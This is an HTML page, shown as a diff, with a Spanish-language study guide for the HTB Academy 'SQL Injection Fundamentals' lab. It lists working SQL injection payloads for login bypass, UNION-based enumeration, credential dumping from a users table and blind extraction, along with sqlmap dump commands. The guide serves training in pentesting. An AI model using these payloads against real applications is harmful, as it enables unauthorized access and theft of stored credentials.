@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="HTB Academy - SQL Injection Fundamentals - HTB Challenge"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>HTB Academy - SQL Injection Fundamentals | HTB Challenge</title><link rel="stylesheet" href="/challenges/_astro/_slug_-Bxg8atdN.css">
+<style>.markdown-body{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;line-height:1.8;color:#e5e7eb}.markdown-body h1{font-size:2rem;font-weight:700;color:#f97316;margin:2rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid #374151}.markdown-body h2{font-size:1.5rem;font-weight:600;color:#22d3ee;margin:1.75rem 0 1rem;padding-bottom:.25rem}.markdown-body h3{font-size:1.25rem;font-weight:600;color:#a5f3fc;margin:1.5rem 0 .75rem}.markdown-body p{margin:.75rem 0;color:#d1d5db}.markdown-body strong{color:#fbbf24;font-weight:600}.markdown-body ul,.markdown-body ol{margin:.75rem 0;padding-left:1.5rem;color:#d1d5db}.markdown-body li{margin:.5rem 0;list-style-type:disc}.markdown-body table{width:100%;margin:1rem 0;border-collapse:collapse;font-size:.9rem}.markdown-body th,.markdown-body td{padding:.75rem;border:1px solid #374151;text-align:left}.markdown-body th{background:#37415180;color:#fbbf24;font-weight:600}.markdown-body td{color:#d1d5db}.markdown-body code{background:#06b6d426;color:#22d3ee;padding:.2rem .5rem;border-radius:.375rem;font-family:SF Mono,Monaco,Courier New,monospace;font-size:.875rem}.markdown-body pre{background:#0f172a;padding:1rem;border-radius:.75rem;overflow-x:auto;margin:1rem 0;border:1px solid #1e293b}.markdown-body pre code{background:transparent;padding:0;color:#a5b4fc}
+</style></head> <body class="bg-dark-bg text-gray-100 min-h-screen"> <header class="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 border-b border-dark-border"> <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4"> <nav class="flex mb-6" aria-label="Breadcrumb"> <ol class="flex items-center space-x-2"> <li class="flex items-center">  <a href="/challenges" class="text-cyan-400 hover:text-cyan-300 transition-colors"> Challenges </a> </li><li class="flex items-center"> <span class="text-gray-500 mx-2">/</span> <a href="/challenges/htb" class="text-cyan-400 hover:text-cyan-300 transition-colors"> HTB </a> </li><li class="flex items-center"> <span class="text-gray-500 mx-2">/</span> <span class="text-gray-300 font-medium">HTB Academy - SQL Injection Fundamentals</span> </li> </ol> </nav> </nav> <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12"> <div class="flex items-center space-x-4 mb-4"> <span class="px-4 py-2 bg-gradient-to-r from-green-500 to-teal-600 rounded-full text-lg font-bold text-white">
+🎯
+</span> <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">✅ Completado</span> <span class="px-3 py-1 bg-slate-700 rounded-full text-sm">⭐ medium</span> <span class="px-3 py-1 bg-slate-700 rounded-full text-sm">HTB</span> </div> <h1 class="text-4xl font-bold text-white mb-2">HTB Academy - SQL Injection Fundamentals</h1> <p class="text-gray-400">HTB Challenge</p> </div> </header> <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12"> <article class="prose prose-invert max-w-none"> <div class="bg-dark-card rounded-xl border border-dark-border p-8">  <div class="flex flex-wrap gap-2 mb-6"> <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#sql-injection</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#web-security</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#owasp</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#htb-academy</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#pentesting</span> </div> <div class="markdown-body"><h1>🎓 HTB Academy - SQL Injection Fundamentals</h1>
+<h2>🎭 Ataques de Inyección SQL</h2>
+<hr>
+<p>👨‍🏫 <strong>Del Instructor</strong>: Bienvenido al módulo de SQL Injection. Como Web Pentester, SQLi es una de las vulnerabilidades más críticas y comunes. Dominar esta técnica te permite acceder a datos sensibles, bypassear autenticación y potencialmente comprometer el servidor completo.</p>
+<blockquote>
+<p>🎯 <strong>Mentalidad de Hacker</strong>: &quot;Las bases de datos son las cajas fuertes de las aplicaciones web. SQL Injection es el arte de convencer a la aplicación de que tus consultas son legítimas, abriendo la caja fuerte sin llave.&quot;</p>
+</blockquote>
+<hr>
+<h2>🎭 El Escenario: Web Application Assessment</h2>
+<h3>Contexto del Pentest</h3>
+<p>Estás realizando un web application assessment para un cliente. Durante el reconnaissance, has identificado una aplicación web con formularios de login y búsqueda. Tu objetivo es detectar y explotar vulnerabilidades SQL Injection para:</p>
+<ul>
+<li>Acceder a datos sensibles de la base de datos</li>
+<li>Bypassear mecanismos de autenticación</li>
+<li>Demostrar el impacto de la vulnerabilidad</li>
+</ul>
+<p><strong>Tu misión como Web Pentester</strong>:</p>
+<ul>
+<li>Identificar puntos de inyección</li>
+<li>Determinar el tipo de base de datos</li>
+<li>Extraer información sensible</li>
+<li>Documentar la vulnerabilidad</li>
+</ul>
+<h2>🧠 Fundamentos de Análisis: SQL Injection</h2>
+<h3>¿Qué es SQL Injection?</h3>
+<p>SQL Injection ocurre cuando input del usuario es concatenado directamente en una consulta SQL sin sanitización:</p>
+<pre><code class="language-sql">-- Consulta vulnerable
+SELECT * FROM users WHERE username = &#39;$input&#39; AND password = &#39;$password&#39;
+
+-- Input malicioso: &#39; OR &#39;1&#39;=&#39;1&#39; --
+-- Resultado:
+SELECT * FROM users WHERE username = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; --&#39; AND password = &#39;&#39;
+</code></pre>
+<h3>Tipos de SQL Injection</h3>
+<pre><code>SQL Injection Types:
+├── In-Band (Clásico)
+│   ├── Error-based
+│   └── Union-based
+├── Blind
+│   ├── Boolean-based
+│   └── Time-based
+└── Out-of-Band
+    └── DNS/HTTP exfiltration
+</code></pre>
+<h3>OWASP Top 10</h3>
+<p>SQL Injection es #3 en OWASP Top 10 2021 (A03:2021 - Injection).</p>
+<h2>🔍 Metodología de Investigación</h2>
+<h3>Paso 1: Detección de Inyección</h3>
+<pre><code class="language-bash"># Payloads de detección inicial
+&#39; OR &#39;1&#39;=&#39;1
+&#39; OR &#39;1&#39;=&#39;1&#39; --
+&#39; OR &#39;1&#39;=&#39;1&#39; /*
+1&#39; OR &#39;1&#39;=&#39;1
+1 OR 1=1
+1&#39; AND &#39;1&#39;=&#39;1
+
+# Observar respuestas:
+# - Error SQL expuesto
+# - Comportamiento diferente (true/false)
+# - Tiempo de respuesta anómalo
+
+# Usar comillas simples para romper sintaxis
+# Si hay error SQL, es vulnerable
+</code></pre>
+<h3>Paso 2: Determinar Número de Columnas</h3>
+<pre><code class="language-bash"># UNION injection - encontrar número de columnas
+&#39; ORDER BY 1--
+&#39; ORDER BY 2--
+&#39; ORDER BY 3--
+# Continuar hasta error
+
+# Alternativa con NULL
+&#39; UNION SELECT NULL--
+&#39; UNION SELECT NULL,NULL--
+&#39; UNION SELECT NULL,NULL,NULL--
+
+# MySQL ejemplo:
+&#39; UNION SELECT 1,2,3--
+</code></pre>
+<h3>Paso 3: Identificar Base de Datos</h3>
+<pre><code class="language-bash"># MySQL
+&#39; UNION SELECT @@version,2,3--
+
+# PostgreSQL
+&#39; UNION SELECT version(),2,3--
+
+# SQL Server
+&#39; UNION SELECT @@version,2,3--
+
+# Oracle
+&#39; UNION SELECT banner,NULL,NULL FROM v$version--
+
+# SQLite
+&#39; UNION SELECT sqlite_version(),2,3--
+</code></pre>
+<h3>Paso 4: Extraer Información</h3>
+<pre><code class="language-bash"># Listar bases de datos (MySQL)
+&#39; UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--
+
+# Listar tablas
+&#39; UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+# Listar columnas
+&#39; UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name=&#39;users&#39;--
+
+# Extraer datos
+&#39; UNION SELECT username,password,NULL FROM users--
+
+# Concatenar múltiples columnas
+&#39; UNION SELECT CONCAT(username,&#39;:&#39;,password),NULL,NULL FROM users--
+</code></pre>
+<h3>Paso 5: Blind SQL Injection</h3>
+<pre><code class="language-bash"># Boolean-based blind
+# True condition (muestra contenido normal)
+&#39; AND 1=1--
+# False condition (no muestra contenido)
+&#39; AND 1=2--
+
+# Extraer caracter a caracter
+&#39; AND SUBSTRING(database(),1,1)=&#39;a&#39;--
+&#39; AND SUBSTRING(database(),1,1)=&#39;b&#39;--
+# Continuar hasta encontrar el caracter correcto
+
+# Time-based blind
+&#39; AND SLEEP(5)--
+&#39; AND IF(1=1,SLEEP(5),0)--
+
+# Extraer con time-based
+&#39; AND IF(SUBSTRING(database(),1,1)=&#39;a&#39;,SLEEP(5),0)--
+</code></pre>
+<h3>Paso 6: Usar sqlmap (Automatizado)</h3>
+<pre><code class="language-bash"># Instalar sqlmap
+sudo apt install sqlmap
+
+# Test básico
+sqlmap -u &quot;http://target.com/page?id=1&quot; --batch
+
+# Especificar parámetro
+sqlmap -u &quot;http://target.com/page?id=1&quot; -p id --batch
+
+# Enumerar bases de datos
+sqlmap -u &quot;http://target.com/page?id=1&quot; --dbs --batch
+
+# Enumerar tablas
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database_name --tables --batch
+
+# Dump tabla
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database_name -T users --dump --batch
+
+# POST request
+sqlmap -u &quot;http://target.com/login&quot; --data=&quot;username=admin&amp;password=test&quot; --batch
+</code></pre>
+<h2>🛠️ Arsenal de Herramientas</h2>
+<table>
+<thead>
+<tr>
+<th>Herramienta</th>
+<th>Uso</th>
+<th>Comando</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sqlmap</code></td>
+<td>Automatización SQLi</td>
+<td><code>sqlmap -u URL --dbs</code></td>
+</tr>
+<tr>
+<td><code>Burp Suite</code></td>
+<td>Interceptación manual</td>
+<td>Proxy + Repeater</td>
+</tr>
+<tr>
+<td><code>SQLi Scanner</code></td>
+<td>Detección rápida</td>
+<td>Extensions</td>
+</tr>
+<tr>
+<td><code>Manual</code></td>
+<td>Técnicas específicas</td>
+<td>UNION, Blind</td>
+</tr>
+</tbody></table>
+<h2>✅ Checklist de Verificación</h2>
+<ul>
+<li><input disabled="" type="checkbox"> Identificar puntos de entrada (forms, URLs)</li>
+<li><input disabled="" type="checkbox"> Testear payloads de detección</li>
+<li><input disabled="" type="checkbox"> Determinar tipo de SQLi</li>
+<li><input disabled="" type="checkbox"> Identificar DBMS</li>
+<li><input disabled="" type="checkbox"> Enumerar bases de datos</li>
+<li><input disabled="" type="checkbox"> Enumerar tablas y columnas</li>
+<li><input disabled="" type="checkbox"> Extraer datos sensibles</li>
+<li><input disabled="" type="checkbox"> Documentar con PoC</li>
+</ul>
+<h2>🎓 Lo Que Acabas de Aprender</h2>
+<p><strong>Habilidades Técnicas</strong>:</p>
+<ul>
+<li>Detección manual de SQL Injection</li>
+<li>Técnicas UNION-based y Blind</li>
+<li>Uso de sqlmap para automatización</li>
+<li>Extracción de datos sensibles</li>
+</ul>
+<p><strong>Mentalidad de Pentester</strong>:</p>
+<ul>
+<li><strong>Paciencia metodológica</strong>: Blind SQLi requiere iteración</li>
+<li><strong>Creatividad</strong>: Cada app es diferente</li>
+<li><strong>Documentación</strong>: Guardar todos los payloads exitosos</li>
+</ul>
+<h2>🚀 Próximos Pasos</h2>
+<ol>
+<li><strong>Advanced SQLi</strong>: WAF bypass, second-order</li>
+<li><strong>NoSQL Injection</strong>: MongoDB, etc.</li>
+<li><strong>OS Command Injection</strong>: Desde SQLi a RCE</li>
+<li><strong>Reporting</strong>: Documentar vulnerabilidades</li>
+</ol>
+<h2>📚 Recursos HTB Academy</h2>
+<ul>
+<li><a href="https://academy.hackthebox.com/module/details/33">HTB Academy - SQL Injection Fundamentals</a></li>
+<li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
+<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger SQLi Cheat Sheet</a></li>
+<li><a href="https://github.com/sqlmapproject/sqlmap">sqlmap Documentation</a></li>
+</ul>
+<hr>
+<h2>✅ Estado</h2>
+<p><strong>LISTO PARA COMPLETAR</strong> 🔵</p>
+<ul>
+<li>📅 Fecha: 2026-02-17</li>
+<li>⏱️ Tiempo estimado: 50 minutos</li>
+<li>🎯 Dificultad: Media (HTB Academy Intermediate)</li>
+</ul>
+</div> </div> </article> <div class="mt-8 flex justify-between items-center"> <a href="/challenges/htb/" class="px-6 py-3 bg-slate-700 hover:bg-slate-600 rounded-lg transition-colors">
+← Volver
+</a> <button onclick="openModal('web-security/sql-injection')" class="px-6 py-3 bg-gradient-to-r from-green-500 to-teal-600 hover:from-green-600 hover:to-teal-700 rounded-lg transition-all font-medium flex items-center gap-2 shadow-lg shadow-green-500/25"> <span>📋</span> <span>Ver Solución Paso a Paso</span> </button> </div> </main> <div id="modal-web-security/sql-injection" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50" aria-hidden="true"> <div class="flex items-center justify-center min-h-screen p-4"> <div class="bg-slate-800 rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto"> <div class="p-6 border-b border-slate-700"> <div class="flex justify-between items-start"> <div> <h2 class="text-2xl font-bold text-gray-100">HTB Academy - SQL Injection Fundamentals</h2> <div class="flex items-center gap-4 mt-2 text-sm"> <span class="capitalize bg-slate-700 px-2 py-1 rounded">web-security</span> <span class="text-cyan-400">medium</span>  </div> </div> <button onclick="closeModal('web-security/sql-injection')" class="text-gray-400 hover:text-white">
+✕
+</button> </div> </div> <div class="p-6"> <div class="mb-6"> <h3 class="text-lg font-semibold text-cyan-400 mb-4">Pasos a Seguir</h3> <div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">1. Comandos de Solución</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>&#39; OR &#39;1&#39;=&#39;1
+&#39; OR &#39;1&#39;=&#39;1&#39; --
+&#39; OR &#39;1&#39;=&#39;1&#39; /*
+1&#39; OR &#39;1&#39;=&#39;1
+1 OR 1=1
+1&#39; AND &#39;1&#39;=&#39;1</code>
+                  </pre>  </div> </div> <div class="mb-6"> <h3 class="text-lg font-semibold text-yellow-400 mb-4">Verificación</h3> <ul class="space-y-2"> <li class="flex items-center text-gray-300"> <span class="text-green-400 mr-2">✓</span> Reto completado </li><li class="flex items-center text-gray-300"> <span class="text-green-400 mr-2">✓</span> Puntuación obtenida </li> </ul> </div>   </div> </div> </div> </div> <script type="module">document.addEventListener("click",e=>{const t=e.target;t.classList.contains("bg-black")&&(t.classList.add("hidden"),t.setAttribute("aria-hidden","true"))});</script> <footer class="border-t border-dark-border mt-16"> <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 text-center text-gray-500 text-sm"> <p>Technical Challenges Repository | HTB Challenge</p> </div> </footer> <script type="module">function e(d){const o=document.getElementById(`modal-${d}`);o&&(o.classList.remove("hidden"),document.body.style.overflow="hidden")}window.openModal=e;</script> </body> </html>
